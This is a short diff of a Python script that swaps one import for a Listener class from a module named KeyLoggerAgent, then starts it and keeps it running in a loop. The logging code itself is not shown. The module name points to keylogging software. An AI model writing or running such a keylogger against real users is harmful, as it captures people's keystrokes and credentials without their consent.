@@ -1,9 +1,11 @@
-import chek
+from KeyLoggerAgent import Listener
 import time
 
-
-
-chek.listener.start()
-while chek.listener.running:
+Listener.start()
+while Listener.running:
     # להריץ קוד במקביל אם צריך
     time.sleep(0.01)
+
+
+
+
